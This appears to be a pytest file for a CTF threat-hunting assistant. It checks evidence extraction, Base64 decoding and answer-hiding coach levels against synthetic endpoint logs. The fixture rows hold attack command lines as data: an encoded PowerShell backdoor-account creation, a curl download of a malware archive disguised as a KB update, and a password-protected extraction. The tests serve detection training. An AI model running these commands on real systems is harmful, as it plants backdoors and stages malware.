"""Evidence pre-filter + coach mode (model-free)."""
import base64
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import EVIDENCE_FILTER
import CTF_HUNT_MODE
import PROMPT_MANAGEMENT

HEADER = "TimeGenerated,DeviceName,AccountName,ProcessCommandLine,FolderPath,FileName"


def _b64ps(cmd):  # PowerShell -enc takes UTF-16LE base64
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


def make_rows():
    rows = [HEADER]
    for i in range(1, 121):
        rows.append(f'2026-03-15T10:{i % 60:02d}:00Z,azuki-vm0{i % 5},user{i % 7},"svchost.exe -k netsvcs",C:\\Windows\\System32\\,svchost.exe')
    rows[30] = f'2026-03-15T10:30:00Z,azuki-adminpc,kenji.sato,"powershell.exe -enc {_b64ps("net user backdoor_svc P@ss123 /add")}",C:\\Users\\Public\\,powershell.exe'
    rows[45] = '2026-03-15T10:45:00Z,azuki-adminpc,kenji.sato,"curl.exe -o C:\\ProgramData\\KB5044273.zip http://files.catbox.moe/abc.zip",C:\\ProgramData\\,curl.exe'
    rows[60] = '2026-03-15T11:00:00Z,azuki-adminpc,kenji.sato,"7z.exe x C:\\ProgramData\\KB5044273.zip -pInfected -oC:\\ProgramData\\",C:\\ProgramData\\,7z.exe'
    return "\n".join(rows)


def test_base64_is_decoded_and_surfaced():
    flag = {"objective": "What is the decoded Base64 command?", "format": "decoded command", "hints": ["Decode the payload to reveal the account creation command"]}
    ev = EVIDENCE_FILTER.extract_candidates(make_rows(), flag)
    assert "base64" in ev["families"]
    assert any("net user backdoor_svc" in d["decoded"] for d in ev["decoded"])
    top = ev["candidates"][0]
    assert top["family"] == "base64" and top["row_ids"] == [30]


def test_download_command_ranks_first_for_command_flag():
    flag = {"objective": "What command was used to download the malicious archive?", "format": "Full command line",
            "hints": ["Search DeviceProcessEvents for command-line utilities capable of retrieving remote files", "The downloaded file masquerades as a Windows security update (KB format)"]}
    ev = EVIDENCE_FILTER.extract_candidates(make_rows(), flag)
    values = [c["value"] for c in ev["candidates"]]
    assert any("curl.exe" in v and "KB5044273" in v for v in values[:2])
    assert all("svchost.exe -k netsvcs" != v for v in values[:3]), "the 117x background noise must not rank near the top"


def test_domain_flag_finds_hosting_service():
    flag = {"objective": "What file hosting service was used to stage malware?", "format": "domain", "hints": []}
    ev = EVIDENCE_FILTER.extract_candidates(make_rows(), flag)
    assert any("catbox.moe" in c["value"] for c in ev["candidates"])


def test_candidate_rows_feed_the_sampler():
    flag = {"objective": "What command was used to download the malicious archive?", "format": "Full command line", "hints": []}
    csv = make_rows()
    ev = EVIDENCE_FILTER.extract_candidates(csv, flag)
    ids = EVIDENCE_FILTER.candidate_row_ids(ev)
    sampled = CTF_HUNT_MODE._smart_sample_csv_for_ctf(csv, flag["objective"], max_chars=2500, flag_intel=flag, priority_row_ids=ids)
    lines = [l for l in sampled.split("\n") if l and not l.startswith("#")]
    assert any(l.startswith("45,") for l in lines), "candidate row 45 must be force-included even in a tiny budget"


def test_coach_level_1_hides_values_level_3_shows_them():
    flag = {"objective": "Identify the C2 beacon filename?", "format": "filename", "hints": []}
    ev = EVIDENCE_FILTER.extract_candidates(make_rows(), flag)
    l1 = EVIDENCE_FILTER.render_for_human(ev, 1)
    l3 = EVIDENCE_FILTER.render_for_human(ev, 3)
    assert "curl.exe" not in l1 and "KB5044273" not in l1
    assert "candidate value(s) stand out" in l1
    assert "KB5044273" in l3


def test_ctf_schema_is_strict_and_complete():
    sc = PROMPT_MANAGEMENT.CTF_ANSWER_SCHEMA
    assert sc["additionalProperties"] is False
    assert set(sc["required"]) == set(sc["properties"].keys())
    assert "guidance" in sc["properties"] and "candidates" in sc["properties"]


def test_display_gating_never_prints_answer_below_level_3(capsys):
    analysis = {"suggested_answer": "SECRET-ANSWER", "confidence": "High", "evidence_rows": [45],
                "evidence_fields": ["ProcessCommandLine"], "explanation": "because SECRET-ANSWER", "correlation": "",
                "guidance": "Look at command lines that fetch remote files", "candidates": [{"value": "SECRET-ANSWER", "row_ids": [45], "why": "x"}]}
    CTF_HUNT_MODE.display_llm_analysis(analysis, level=1)
    out = capsys.readouterr().out
    assert "SECRET-ANSWER" not in out and "Look at command lines" in out
    CTF_HUNT_MODE.display_llm_analysis(analysis, level=3)
    assert "SECRET-ANSWER" in capsys.readouterr().out


def test_refined_analysis_ignores_coach_placeholder():
    s = CTF_HUNT_MODE.CtfChatSession.__new__(CTF_HUNT_MODE.CtfChatSession)
    s.coach_level = 1
    s.llm_analysis = {"suggested_answer": "", "confidence": "Low"}
    s.conversation_history = [{"role": "assistant", "content": "**ANSWER EXTRACTION:**\nwithheld at coach level 1\n\n**CONFIDENCE:**\n[Low]"}]
    assert s._extract_refined_analysis()["suggested_answer"] == ""


def test_documentation_menu_hides_answer_until_revealed(capsys, monkeypatch):
    monkeypatch.setattr("builtins.input", lambda *_: "4")
    analysis = {"suggested_answer": "SECRET", "confidence": "High", "revealed": False}
    action = CTF_HUNT_MODE.result_documentation_menu(analysis, model="qwen3:8b")
    out = capsys.readouterr().out
    assert action == "switch_model" and "SECRET" not in out and "different model" in out
    analysis["revealed"] = True
    monkeypatch.setattr("builtins.input", lambda *_: "3")
    assert CTF_HUNT_MODE.result_documentation_menu(analysis, model="qwen3:8b") == "use_llm_answer"
    assert "SECRET" in capsys.readouterr().out
